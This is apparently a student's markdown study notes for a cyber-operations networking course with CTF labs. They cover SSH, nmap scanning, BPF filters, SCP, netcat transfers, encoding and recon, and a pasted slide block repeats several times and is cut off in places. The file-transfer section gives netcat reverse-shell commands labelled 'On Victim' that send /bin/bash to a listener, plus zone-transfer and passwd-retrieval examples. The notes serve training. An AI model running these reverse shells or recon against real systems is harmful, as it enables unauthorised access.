## Networking 
## https://net.cybbh.io/public/networking/latest/index.html
## https://miro.com/app/board/o9J_klSqCSY=/

![image](https://github.com/user-attachments/assets/ee7f5f6a-a8bb-4c50-ac9d-f6dda018907f)

## ExplainShell.com  //  https://explainshell.com/
## Subnet Chart // https://www.engineeringradio.us/blog/wp-content/uploads/2013/01/Subnet_Chart.pdf
## Linux Commands // https://fossbytes.com/a-z-list-linux-command-line-reference/
## CTF : http://networking-ctfd-2.server.vta:8000/
## Day 1 slide Deck
```
https://net.cybbh.io/-/public/-/jobs/875409/artifacts/modules/networking/slides-v4/01_data.html
```
## SSH Key Change Fix
```
ssh-keygen -f "/home/student/.ssh/known_hosts" -R "172.16.82.106"

    Copy/Paste the ssh-keygen message to remove the Host key from the known_hosts file

    When you re-connect it will prompt you to save the new Host key
```
## SSH FILES
```
    Known-Hosts Database

    ~/.ssh/known_hosts

    Configuration Files

    /etc/ssh/ssh_config
    /etc/ssh/sshd_config
```
## VIEW/CHANGE SSH PORT
```
    To view the current configured SSH port

    cat /etc/ssh/sshd_config | grep Port

    Edit file to change the SSH Port

    sudo nano /etc/ssh/sshd_config

    Restart the SSH Service

    systemctl restart ssh
```
## Hints
```
1. To view your IP address and interface information:
        a. current =        ip address (ip addr)
        b. deprecated =     ifconfig

    2. To view your ARP cache:
        a. current =        ip neighbor (ip nei)
        b. deprecated =     arp -a

    3. To view open TCP and UDP sockets:
        a. current = 
            i. TCP =        ss -antlp
            ii. UDP =       ss -anulp
        b. deprecated =     netstat

    4. To create, edit, or modify a file from the command line:
        a. vi =             vi <file>
        b. vim =            vim <file>
        c. nano =           nano <file>
    
    5. To view active processes:
        a. static =         ps -elf
        b. real-time =      top or htop

    6. To open file manager from the command line from X11 connection:
        a. nautilus
        b. pcmanfm

    7. Web Browsers from X11 connection:
        a. Firefox
        b. Chromium
        c. Konqueror

    8. To open images from the command line from X11 connection:
        a. Eye of Gnome =                   eog [file]
        b. Nomacs =                         nomacs [file]
        c. Eye of Mate =                    eom [file]
        d. GNU Image Manipulation Program = gimp [file]

    9. Find command:
        a. find / -iname <file pattern> 2>/dev/null
            / = starting location of search
            -iname = search for <file patter> with no case sensitivity
            <file pattern> = name of file to search for. Can use '*' as wildcards.
            2>/dev/null = send all errors to /dev/null

    10. Network scanning:
        a. nmap
            -sT = TCP Full connection
                nmap -sT 10.10.0.40 -p 21-23,80
            -sS = TCP SYN scanning
                sudo nmap -sS 10.10.0.40 -p 21-23,80
            -Pn = Disable ping sweep
                nmap -Pn -sT 10.10.0.40 -p 21-23,80
            -sU = UDP scanning
                sudo nmap -sU 10.10.0.40 -p 1000-2000
            -p- = Scan all ports
                nmap -sT 10.10.0.40 -p-
                nmap -sT 10.10.0.40 -p 1-65535
        b. zenmap
        c. netcat
            TCP: nc -nzvw1 10.10.0.40 21-23 80
            UDP: nc -unzvw1 10.10.0.40 53 69
        d. ping
            ping 10.10.0.40
        e. traceroute
            traceroute 172.16.82.106

    11. Network Utilization:
        a. iftop
        b. iptraf-ng

    12. Packet Manipulation (requires root privileges):
        a. scapy
        b. hping3
        c. yersinia     yersinia -G

    13. Packet Sniffing (requires root privileges):
        a. Wireshark
        b. tcpdump
        c. p0f
        d. tshark

    14. Banner Grabbing:
        a. netcat
            Client: nc 10.10.0.40 22
            Listener: nc -lvp 1234
        b. telnet
            telnet 10.10.0.40
            telnet 10.10.0.40 2323
            telnet localhost 1111
        c. wget
            wget -r http://10.10.0.40
            wget -r http://10.10.0.40:8080
            wget -r http://localhost:1111
            wget -r ftp://10.10.0.40
        d. curl
            curl http://10.10.0.40
            curl http://10.10.0.40:8080
            curl http://localhost:1111
            curl ftp://10.10.0.40

    15. DNS Query:
        a. whois
            whois google.com
        b. dig
            Records:
                A - IPv4
                    dig domain_name A
                AAAA - IPv6
                    dig domain_name AAAA
                NS - Name Server
                    dig domain_name NS
                SOA - Start of Authority
                    dig domain_name SOA
                MX - Mail Server
                    dig domain_name MX
                TXT - Human readable message
                    dig domain_name TXT
                AXFR - Zone Transfer
                    dig AXFR @dns_server domain_name

    16. Remote access:
        a. ssh
            ssh student@10.10.0.40
            ssh student@10.10.0.40 -p 2222
            ssh student@localhost -p 2222
        b. telnet
            telnet 10.10.0.40
            telnet 10.10.0.40 2323
            telnet localhost 1111

    17. File Transfer:
        a. scp
            scp student@10.10.0.40:/usr/share/cctc/flag.png .
            scp -P 2222 student@10.10.0.40:/usr/share/cctc/flag.png .
            scp -P 2222 student@localhost:/usr/share/cctc/flag.png .
            scp flag.png student@10.10.0.40:
            scp -P 2222 flag.png student@10.10.0.40:
            scp -P 2222 flag.png student@localhost:
        b. netcat
            nc 10.10.0.40 1234 < flag.png
            nc -lvp 1234 > flag.png
        c. ftp
            ftp 10.10.0.40
            
    18. Creating SSH Tunnels:
        a. Local Port Forward:
            ssh <user>@<server.ip> -p <alt port> -L <local bind port>:<tgt ip>:<tgt port>
        b. Remote Port Forward:
            ssh <user>@<server.ip> -p <alt port> -R <server bind port>:<tgt ip>:<tgt port>
        c. Dynamic:
            ssh <user>@<server.ip> -p <alt port> -D 9050
OUTCOMES

    Describe Data Transfer and Exfiltration

    Demonstrate File Transfer

Rationale

Learning standard file transfer protocols such as FTP,
SFTP, and SCP provides cybersecurity professionals with
essential knowledge of secure and reliable methods for
transferring files over networks, ensuring data integrity
and confidentiality. Understanding netcat and netcat relays
offers valuable insights into versatile tools commonly used
for creating network connections and transferring files,
both by defenders and malicious actors. Additionally,
familiarity with hex and base64 encoding techniques is
crucial for analyzing encoded data, which may conceal
sensitive information or malware payloads. Mastery of these
concepts equips cybersecurity practitioners with the skills
necessary to detect, prevent, and respond to file transfer-
related threats effectively, thereby bolstering the overall
security posture of their organizations.

Assessment

    You will be assessed via CTFd challenges where you will need to score 28/40 points to achieve a 70%.

Standard file transfer methods

    Describe common file transfer methods

    Understand the use of Active and Passive FTP modes

    Use SCP to transfer files

Describe common methods for transferring data

    TFTP

    FTP

        Active

        Passive

    FTPS

    SFTP

    SCP

TFTP

Trivial File Transfer Protocol

    RFC 1350 Rev2

    UDP transport

    Extremely small and very simple communication

    No terminal communication

    Insecure (no authentication or encryption)

    No directory services

    Used often for technologies such as BOOTP and PXE

FTP

File Transfer Protocol

    RFC 959

    Uses 2 separate TCP connections

    Control Connection (21) / Data Connection (20*)

    Authentication in clear-text

    Insecure in default configuration

    Has directory services

    Anonymous login

FTP Active

ftpa
FTP Active for Anonymous

bob@bob-host:~$ ftp 10.0.0.104
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:bob): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: (no password)
230-Welcome, archive user anonymous@10.0.0.101 !
230-
230-The local time is: Fri May 03 15:46:43 2024
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@james-host.novalocal>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          8323 Dec 29 17:08 flag.png
-rw-r--r--   1 ftp      ftp            74 Dec 29 17:08 hint.txt
-rw-r--r--   1 ftp      ftp           170 Aug 30  2021 welcome.msg
226 Transfer complete
ftp>

SCP

Secure Copy Protocol

    TCP Transport (port 22)

    Uses symmetric and asymmetric encryption

    Authentication through sign in (username and password) or with SSH key

    Non-Interactive

SCP Options

.  - Present working directory
-v - verbose mode
-P - alternate port
-r - recursively copy an entire directory
-3 - 3-way copy

SCP Syntax
Download a file from a remote directory to a local directory

$ scp student@172.16.82.106:secretstuff.txt /home/student

Upload a file to a remote directory from a local directory

$ scp secretstuff.txt student@172.16.82.106:/home/student

Copy a file from a remote host to a separate remote host

$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
password:    password:

SCP Syntax
Recursive upload of a folder to remote

$ scp -r folder/ student@172.16.82.106:

Recursive download of a folder from remote

$ scp -r student@172.16.82.106:folder/ .

Conduct Uncommon Methods of File Transfer

    Demonstrate the use of Netcat for data transfer

    Perform traffic redirection using Netcat relays

    Discuss the use of named and unnamed pipes

    Conduct file transfers using /dev/tcp

NETCAT

NETCAT simply reads and writes data across network socket connections using the TCP/IP protocol.

    Can be used for the following:

        inbound and outbound connections, TCP/UDP, to or from any port

        troubleshooting network connections

        sending/receiving data (insecurely)

        port scanning (similar to -sT in Nmap)

NETCAT: Client to Listener file transfer

    Listener (receive file):

nc -lvp 9001 > newfile.txt

    Client (sends file):

nc 172.16.82.106 9001 < file.txt

Reverse Shells
Reverse shell using NETCAT

    First listen for the shell on your device.

$ nc -lvp 9999

    On Victim using -c :

$ nc -c /bin/bash 10.10.0.40 9999

    On Victim using -e :

$ nc -e /bin/bash 10.10.0.40 9999

Understanding Packing and Encoding

    Discuss the purpose of packers

    Perform Hexadecimal encoding and decoding

    Demonstrate Base64 encoding and decoding

    Conduct file transfers with Base64

1
FILE TRANSFER AND REDIRECTION112-CCTC19 - Networking
    19. To determine if tool or application is installed:
        a. which =              which <tool>
        b. whereis =            whereis <tool>

    20. Create a named pipe file:
        a. mknod =              mknod <file> -p
        b. mkfifo =             mkfifo <file>

    21. File and locations discussed in CCTC Networking:
        a. /etc/passwd =                List of user accounts
        b. /etc/shadow =                User password database
        c. /etc/services =              Services file
        d. /etc/os-release =            OS information
        e. /etc/ssh/ssh_config =        SSH user config 
        f. /etc/ssh/sshd_config =       SSH Daemon config
        g. ~/.ssh/known_hosts =         Public keys of all saved SSH servers
        h. /etc/snort =                 Snort directory
        i. /etc/snort/snort.conf  =     Snort config file
        j. /etc/snort/rules =           Default snort rules directory
        k. /var/log/snort =             Default snort log file directory
        l. /usr/share/cctc =            Default location of flags and files in shared environments
        m. /etc/proxychains.conf =      Proxychains config file
        n. /etc/p0f/p0f.fp =            p0f fingerprint file

    22. File descriptors:
        0 = Standard Input (STDIN)
        1 = Standard Output (STDOUT)
        2 = Standard Error (STDERR)
    
    23. Redirectors:
        > - redirect the STDOUT (1) of a command into a file.
            ls > file.txt
        >> - appends the STDOUT (1) of a command into a file. 
            echo "new data" >> file.txt
        < - redirect the STDOUT (1) of a file into a command.
            sort < input.txt
        | - redirect the STDOUT (1) of one command as STDIN (0) of another command.
            ps aux | grep ssh
        >& - redirect to a file descriptor.
            2>&1 | grep "open" - redirect STDERR(2) to STDOUT(1) the redirect the output to the command "grep"
```
## BPFs Data Link Layer
```
###     Search for unicast (0x00) or multicast (0x01) MAC address.

'ether[0] & 0x01 = 0x00'
'ether[0] & 0x01 = 0x01'
'ether[6] & 0x01 = 0x00'
'ether[6] & 0x01 = 0x01'

###        Search for IPv4, ARP, VLAN Tag, and IPv6 respectively.

ether[12:2] = 0x0800
ether[12:2] = 0x0806
ether[12:2] = 0x8100
ether[12:2] = 0x86dd
```
## BPFs Network Layer
```
###     Search for IHL greater than 5.

'ip[0] & 0x0f > 0x05'
'ip[0] & 15 > 5'

###     Search for ipv4 DSCP value of 16.

'ip[1] & 0xfc = 0x40'
'ip[1] & 252 = 64'
'ip[1] >> 2 = 16'
```
## BPFs Network / Flags MF
```
###      Search for ONLY the RES flag set. DF and MF must be off.

'ip[6] & 0xE0 = 0x80'
'ip[6] & 224 = 128'

###     Search for RES bit set. The other 2 flags are ignored so they can be on or off.

'ip[6] & 0x80 = 0x80'
'ip[6] & 128 = 128'

###     Search for ONLY the DF flag set. RES and MF must be off.

'ip[6] & 0xE0 = 0x40'
'ip[6] & 224 = 64'

###     Search for DF bit set. The other 2 flags are ignored so they can be on or off.

'ip[6] & 0x40 = 0x40'
'ip[6] & 64 = 64'

###     Search for ONLY the MF flag set. RES and DF must be off.

'ip[6] & 0xe0 = 0x20'
'ip[6] & 224 = 32'

###     Search for MF bit set. The other 2 flags are ignored so they can be on or off.

'ip[6] & 0x20 = 0x20'
'ip[6] & 32 = 32'
```
## BPFs Network ICMP/TCP/UDP
```
### Search for ICMPv4(6), TCP, or UDP encapsulated within an ipv4(6) packet.

'ip[9] = 0x01'
'ip[9] = 0x06'
'ip[9] = 0x11'
'ip6[6] = 0x3A'
'ip6[6] = 0x06'
'ip6[6] = 0x11'
```

## BPFs Network IP Addresses
```
### Search for ipv4 source or destination address of 10.1.1.1.

'ip[12:4] = 0x0a010101'
'ip[16:4] = 0x0a010101'
```
## BPFs Transport Layer
```
###     Search for TCP Flags set to ACK+SYN. No other flags can be set.

'tcp[13] = 0x12'
```
## BPF VLAN Hopping between vlans
```
ether[12:4] & 0xffff0fff = 0x81000001 && ether[16:4] & 0xffff0fff = 0x8100000a
```
## /////
## Packet Creation and Socket Programming
## Python Script Stream Socket Sender
```
#!/usr/bin/python3
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
ip_addr = '127.0.0.1'
port = 1111
s.connect((ip_addr, port))
message = b"Message"
s.send(message)
data, conn = s.recvfrom(1024)
print(data.decode('utf-8'))
s.close()

##  change ip_addr / port to the repective ip / port wanting to connect to.
##  message change to what they want the message to be
##  utf-8 = default decoding

nc -lp 1111 ---> run python script

vim text.txt
nc -lp 1111 < text.txt

./stream_sock.py > random.txt
ls
cat random.txt    ( it will have the text.txt information )OUTCOMES

    Describe Data Transfer and Exfiltration

    Demonstrate File Transfer

Rationale

Learning standard file transfer protocols such as FTP,
SFTP, and SCP provides cybersecurity professionals with
essential knowledge of secure and reliable methods for
transferring files over networks, ensuring data integrity
and confidentiality. Understanding netcat and netcat relays
offers valuable insights into versatile tools commonly used
for creating network connections and transferring files,
both by defenders and malicious actors. Additionally,
familiarity with hex and base64 encoding techniques is
crucial for analyzing encoded data, which may conceal
sensitive information or malware payloads. Mastery of these
concepts equips cybersecurity practitioners with the skills
necessary to detect, prevent, and respond to file transfer-
related threats effectively, thereby bolstering the overall
security posture of their organizations.

Assessment

    You will be assessed via CTFd challenges where you will need to score 28/40 points to achieve a 70%.

Standard file transfer methods

    Describe common file transfer methods

    Understand the use of Active and Passive FTP modes

    Use SCP to transfer files

Describe common methods for transferring data

    TFTP

    FTP

        Active

        Passive

    FTPS

    SFTP

    SCP

TFTP

Trivial File Transfer Protocol

    RFC 1350 Rev2

    UDP transport

    Extremely small and very simple communication

    No terminal communication

    Insecure (no authentication or encryption)

    No directory services

    Used often for technologies such as BOOTP and PXE

FTP

File Transfer Protocol

    RFC 959

    Uses 2 separate TCP connections

    Control Connection (21) / Data Connection (20*)

    Authentication in clear-text

    Insecure in default configuration

    Has directory services

    Anonymous login

FTP Active

ftpa
FTP Active for Anonymous

bob@bob-host:~$ ftp 10.0.0.104
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:bob): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: (no password)
230-Welcome, archive user anonymous@10.0.0.101 !
230-
230-The local time is: Fri May 03 15:46:43 2024
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@james-host.novalocal>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          8323 Dec 29 17:08 flag.png
-rw-r--r--   1 ftp      ftp            74 Dec 29 17:08 hint.txt
-rw-r--r--   1 ftp      ftp           170 Aug 30  2021 welcome.msg
226 Transfer complete
ftp>

SCP

Secure Copy Protocol

    TCP Transport (port 22)

    Uses symmetric and asymmetric encryption

    Authentication through sign in (username and password) or with SSH key

    Non-Interactive

SCP Options

.  - Present working directory
-v - verbose mode
-P - alternate port
-r - recursively copy an entire directory
-3 - 3-way copy

SCP Syntax
Download a file from a remote directory to a local directory

$ scp student@172.16.82.106:secretstuff.txt /home/student

Upload a file to a remote directory from a local directory

$ scp secretstuff.txt student@172.16.82.106:/home/student

Copy a file from a remote host to a separate remote host

$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
password:    password:

SCP Syntax
Recursive upload of a folder to remote

$ scp -r folder/ student@172.16.82.106:

Recursive download of a folder from remote

$ scp -r student@172.16.82.106:folder/ .

Conduct Uncommon Methods of File Transfer

    Demonstrate the use of Netcat for data transfer

    Perform traffic redirection using Netcat relays

    Discuss the use of named and unnamed pipes

    Conduct file transfers using /dev/tcp

NETCAT

NETCAT simply reads and writes data across network socket connections using the TCP/IP protocol.

    Can be used for the following:

        inbound and outbound connections, TCP/UDP, to or from any port

        troubleshooting network connections

        sending/receiving data (insecurely)

        port scanning (similar to -sT in Nmap)

NETCAT: Client to Listener file transfer

    Listener (receive file):

nc -lvp 9001 > newfile.txt

    Client (sends file):

nc 172.16.82.106 9001 < file.txt

Reverse Shells
Reverse shell using NETCAT

    First listen for the shell on your device.

$ nc -lvp 9999OUTCOMES

    Describe Data Transfer and Exfiltration

    Demonstrate File Transfer

Rationale

Learning standard file transfer protocols such as FTP,
SFTP, and SCP provides cybersecurity professionals with
essential knowledge of secure and reliable methods for
transferring files over networks, ensuring data integrity
and confidentiality. Understanding netcat and netcat relays
offers valuable insights into versatile tools commonly used
for creating network connections and transferring files,
both by defenders and malicious actors. Additionally,
familiarity with hex and base64 encoding techniques is
crucial for analyzing encoded data, which may conceal
sensitive information or malware payloads. Mastery of these
concepts equips cybersecurity practitioners with the skills
necessary to detect, prevent, and respond to file transfer-
related threats effectively, thereby bolstering the overall
security posture of their organizations.

Assessment

    You will be assessed via CTFd challenges where you will need to score 28/40 points to achieve a 70%.

Standard file transfer methods

    Describe common file transfer methods

    Understand the use of Active and Passive FTP modes

    Use SCP to transfer files

Describe common methods for transferring data

    TFTP

    FTP

        Active

        Passive

    FTPS

    SFTP

    SCP

TFTP

Trivial File Transfer Protocol

    RFC 1350 Rev2

    UDP transport

    Extremely small and very simple communication

    No terminal communication

    Insecure (no authentication or encryption)

    No directory services

    Used often for technologies such as BOOTP and PXE

FTP

File Transfer Protocol

    RFC 959

    Uses 2 separate TCP connections

    Control Connection (21) / Data Connection (20*)

    Authentication in clear-text

    Insecure in default configuration

    Has directory services

    Anonymous login

FTP Active

ftpa
FTP Active for Anonymous

bob@bob-host:~$ ftp 10.0.0.104
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:bob): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: (no password)
230-Welcome, archive user anonymous@10.0.0.101 !
230-
230-The local time is: Fri May 03 15:46:43 2024
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@james-host.novalocal>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          8323 Dec 29 17:08 flag.png
-rw-r--r--   1 ftp      ftp            74 Dec 29 17:08 hint.txt
-rw-r--r--   1 ftp      ftp           170 Aug 30  2021 welcome.msg
226 Transfer complete
ftp>

SCP

Secure Copy Protocol

    TCP Transport (port 22)

    Uses symmetric and asymmetric encryption

    Authentication through sign in (username and password) or with SSH key

    Non-Interactive

SCP Options

.  - Present working directory
-v - verbose mode
-P - alternate port
-r - recursively copy an entire directory
-3 - 3-way copy

SCP Syntax
Download a file from a remote directory to a local directory

$ scp student@172.16.82.106:secretstuff.txt /home/student

Upload a file to a remote directory from a local directory

$ scp secretstuff.txt student@172.16.82.106:/home/student

Copy a file from a remote host to a separate remote host

$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
password:    password:

SCP Syntax
Recursive upload of a folder to remote

$ scp -r folder/ student@172.16.82.106:

Recursive download of a folder from remote

$ scp -r student@172.16.82.106:folder/ .

Conduct Uncommon Methods of File Transfer

    Demonstrate the use of Netcat for data transfer

    Perform traffic redirection using Netcat relays

    Discuss the use of named and unnamed pipes

    Conduct file transfers using /dev/tcp

NETCAT

NETCAT simply reads and writes data across network socket connections using the TCP/IP protocol.

    Can be used for the following:

        inbound and outbound connections, TCP/UDP, to or from any port

        troubleshooting network connections

        sending/receiving data (insecurely)

        port scanning (similar to -sT in Nmap)

NETCAT: Client to Listener file transfer

    Listener (receive file):

nc -lvp 9001 > newfile.txt

    Client (sends file):

nc 172.16.82.106 9001 < file.txt

Reverse Shells
Reverse shell using NETCAT

    First listen for the shell on your device.

$ nc -lvp 9999

    On Victim using -c :OUTCOMES

    Describe Data Transfer and Exfiltration

    Demonstrate File Transfer

Rationale

Learning standard file transfer protocols such as FTP,
SFTP, and SCP provides cybersecurity professionals with
essential knowledge of secure and reliable methods for
transferring files over networks, ensuring data integrity
and confidentiality. Understanding netcat and netcat relays
offers valuable insights into versatile tools commonly used
for creating network connections and transferring files,
both by defenders and malicious actors. Additionally,
familiarity with hex and base64 encoding techniques is
crucial for analyzing encoded data, which may conceal
sensitive information or malware payloads. Mastery of these
concepts equips cybersecurity practitioners with the skills
necessary to detect, prevent, and respond to file transfer-
related threats effectively, thereby bolstering the overall
security posture of their organizations.

Assessment

    You will be assessed via CTFd challenges where you will need to score 28/40 points to achieve a 70%.

Standard file transfer methods

    Describe common file transfer methods

    Understand the use of Active and Passive FTP modes

    Use SCP to transfer files

Describe common methods for transferring data

    TFTP

    FTP

        Active

        Passive

    FTPS

    SFTP

    SCP

TFTP

Trivial File Transfer Protocol

    RFC 1350 Rev2

    UDP transport

    Extremely small and very simple communication

    No terminal communication

    Insecure (no authentication or encryption)

    No directory services

    Used often for technologies such as BOOTP and PXE

FTP

File Transfer Protocol

    RFC 959

    Uses 2 separate TCP connections

    Control Connection (21) / Data Connection (20*)

    Authentication in clear-text

    Insecure in default configuration

    Has directory services

    Anonymous login

FTP Active

ftpa
FTP Active for Anonymous

bob@bob-host:~$ ftp 10.0.0.104
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:bob): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: (no password)
230-Welcome, archive user anonymous@10.0.0.101 !
230-
230-The local time is: Fri May 03 15:46:43 2024
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@james-host.novalocal>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          8323 Dec 29 17:08 flag.png
-rw-r--r--   1 ftp      ftp            74 Dec 29 17:08 hint.txt
-rw-r--r--   1 ftp      ftp           170 Aug 30  2021 welcome.msg
226 Transfer complete
ftp>

SCP

Secure Copy Protocol

    TCP Transport (port 22)

    Uses symmetric and asymmetric encryption

    Authentication through sign in (username and password) or with SSH key

    Non-Interactive

SCP Options

.  - Present working directory
-v - verbose mode
-P - alternate port
-r - recursively copy an entire directory
-3 - 3-way copy

SCP Syntax
Download a file from a remote directory to a local directory

$ scp student@172.16.82.106:secretstuff.txt /home/student

Upload a file to a remote directory from a local directory

$ scp secretstuff.txt student@172.16.82.106:/home/student

Copy a file from a remote host to a separate remote host

$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
password:    password:

SCP Syntax
Recursive upload of a folder to remote

$ scp -r folder/ student@172.16.82.106:

Recursive download of a folder from remote

$ scp -r student@172.16.82.106:folder/ .

Conduct Uncommon Methods of File Transfer

    Demonstrate the use of Netcat for data transfer

    Perform traffic redirection using Netcat relays

    Discuss the use of named and unnamed pipes

    Conduct file transfers using /dev/tcp

NETCAT

NETCAT simply reads and writes data across network socket connections using the TCP/IP protocol.

    Can be used for the following:

        inbound and outbound connections, TCP/UDP, to or from any port

        troubleshooting network connections

        sending/receiving data (insecurely)

        port scanning (similar to -sT in Nmap)

NETCAT: Client to Listener file transfer

    Listener (receive file):

nc -lvp 9001 > newfile.txt

    Client (sends file):

nc 172.16.82.106 9001 < file.txt

Reverse Shells
Reverse shell using NETCAT

    First listen for the shell on your device.

$ nc -lvp 9999

    On Victim using -c :

$ nc -c /bin/bash 10.10.0.40 9999

    On Victim using -e :

$ nc -e /bin/bash 10.10.0.40 9999

Understanding Packing and Encoding

    Discuss the purpose of packers

    Perform Hexadecimal encoding and decoding

    Demonstrate Base64 encoding and decoding

    Conduct file transfers with Base64

1
FILE TRANSFER AND REDIRECTION112-CCTC19 - Networking

$ nc -c /bin/bash 10.10.0.40 9999

    On Victim using -e :

$ nc -e /bin/bash 10.10.0.40 9999

Understanding Packing and Encoding

    Discuss the purpose of packers

    Perform Hexadecimal encoding and decoding

    Demonstrate Base64 encoding and decoding

    Conduct file transfers with Base64

1
FILE TRANSFER AND REDIRECTION112-CCTC19 - Networking

    On Victim using -c :

$ nc -c /bin/bash 10.10.0.40 9999

    On Victim using -e :

$ nc -e /bin/bash 10.10.0.40 9999

Understanding Packing and Encoding

    Discuss the purpose of packers

    Perform Hexadecimal encoding and decoding

    Demonstrate Base64 encoding and decoding

    Conduct file transfers with Base64

1
FILE TRANSFER AND REDIRECTION112-CCTC19 - Networking
```
## sudo tcpdump 'ip[4:2] = 20' -vvXX

## Hex Encoding and Decoding
```
Encode text to Hex:

echo "Message" | xxd

Encode file to Hex:

xxd file.txt file-encoded.txt

Decode file from Hex:

xxd -r file-encoded.txt file-decoded.txt
```
## Base64 Encoding and Decoding
```
Encode text to base64:

echo "Message" | base64

Endode file to Base64:

base64 file.txt > file-encoded.txt

Decode file from Base64:

base64 -d file-encoded.txt > file-decoded.txt
```
## Day 4 Recon
```
Passive
	
External

* PAI/OSINT
* DNS Lookups (DIG)
* Whois
* Job site listings
* Shodan

Internal	

* Packet Sniffing
* ARP Cache
* IP Address
* Running Services
* Open Ports

Active
	
External

* Ping scans
* NMAP scans
* Port Scans
* OS Identification

Internal

* DNS Queries
* ARP Requests
* Ping Scans
* Port Scans
* Network Scanning
```
https://osintframework.com/
https://whois.domaintools.com/
https://centralops.net/co/
https://web-check.xyz/
https://sitereport.netcraft.com/
https://iplocation.io/
https://bgpview.io/

http://archive.org/web/
## Dig / Whois
```
    Whois - queries DNS registrar over TCP port 43

        Information about the owner who registered the domain

whois zonetransfer.me

    Dig - queries DNS server over UDP port 53

        Name to IP records

dig zonetransfer.me A
dig zonetransfer.me AAAA
dig zonetransfer.me MX
dig zonetransfer.me TXT
dig zonetransfer.me NS
dig zonetransfer.me SOA
```
## Zone Transfers
```
dir axfr {@soa.server} {target-site}
dig axfr @nsztm1.digi.ninja zonetransfer.me
```
## Passive OS FingerPrinter (POF)
```
    p0f: Passive scanning of network traffic and packet captures.

more /etc/p0f/p0f.fp

sudo p0f -i eth0

sudo p0f -r test.pcap
```
## Active External
## Ping Sweep 
```
for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done
```
## NMAP Options https://nmap.org/book/man-briefoptions.html   //  https://nmap.org/book/man-port-scanning-techniques.html

## NMAP Scan Types
```
    Broadcast Ping/Ping sweep (-sP, -PE)

    SYN scan (-sS)

    Full connect scan (-sT)

    Null scan (-sN)

    FIN scan (-sF)

    XMAS tree scan (-sX)

    UDP scan (-sU)

    Idle scan (-sI)  (zombie scan)

    Decoy scan (-D)

    ACK/Window scan (-sA)

    RPC scan (-sR)

    FTP scan (-b)

    OS fingerprinting scan (-O)

    Version scan (-sV)

    Discovery probes

	-PE - ICMP Ping

    -Pn - No Ping
```
## NMAP - Delay
```
    --scan-delay <time> - Minimum delay between probes

    --max-scan-delay <time> - Max delay between probes
```
## TRACEROUTE
```
traceroute 172.16.82.106
traceroute 172.16.82.106 -p 123
sudo traceroute 172.16.82.106 -I
sudo traceroute 172.16.82.106 -T
sudo traceroute 172.16.82.106 -T -p 443
```
## NETCAT -scanning
```
nc [Options] [Target IP] [Target Port(s)]

    -z : Port scanning mode i.e. zero I/O mode

    -v : Be verbose [use twice -vv to be more verbose]

    -n : do not resolve ip addresses

    -w1 : Set time out value to 1

    -u : To switch to UDP
```
## Banner Grabbing
```
    Find what is running on a particular port

nc [Target IP] [Target Port]
nc 172.16.82.106 22
nc -u 172.16.82.106 53

( port 80, will hang up, type get)

    -u : To switch to UDP
```
## Curl and WGET
```
    Both can be used to interact with the HTTP, HTTPS and FTP protocols.

    Curl - Displays ASCII

curl http://172.16.82.106
curl ftp://172.16.82.106

    Wget - Downloads (-r recursive)

wget -r http://172.16.82.106
wget -r ftp://172.16.82.106
```
## FTP
```
pull files  /// get passwd (for etc/passwd)
```
## IPCONFIG
```
Windows: ipconfig /all
Linux: ip address (ifconfig depreciated)
VyOS: show interface
```
## DNS COnfiguration
```
Windows: ipconfig /displaydns
Linux: cat /etc/resolv.conf
```
## ARP Cache
```
Windows: arp -a
Linux: ip neighbor (arp -a depreciated)
```
## Network Connections
```
Windows: netstat
Linux: ss (netstat depreciated)

Example options useful for both netstat and ss: -antp
a = Displays all active connections and ports.
n = No determination of protocol names. Shows 22 not SSH.
t = Display only TCP connections.
u = Display only UDP connections.
p = Shows which processes are using which sockets.
l = listening ports
```
## Service Files
```
Windows: %SystemRoot%\system32\drivers\etc\services

Linux/Unix: /etc/services
```
## OS INFO
```
Windows: systeminfo
Linux: uname -a and /etc/os-release
```
## RUNNING PROCESS
```
Windows: tasklist
Linux: ps or top

Example options useful for ps: -elf
e = Show all running processes
l = Show long format view
f = Show full format listing
```
## File Search
```
find / -iname hint* 2> /dev/null
find / -iname flag* 2> /dev/null
```
## Methodology
```
Net Recon Methodology

     - Host discovery
	+ Ruby ping sweep ( if ping available)
		for i in [1..254] ;do (ping -c 1 192.168.1.$i 2>/dev/null | grep "bytes from" &) ;done

	+ NMAP scan if no ping (Check scan meothodology below)

     - Port Discovery
	+ nmap
	+ nc scan script

     Port Validation
	+ banner grab using nc [ip addr][port]

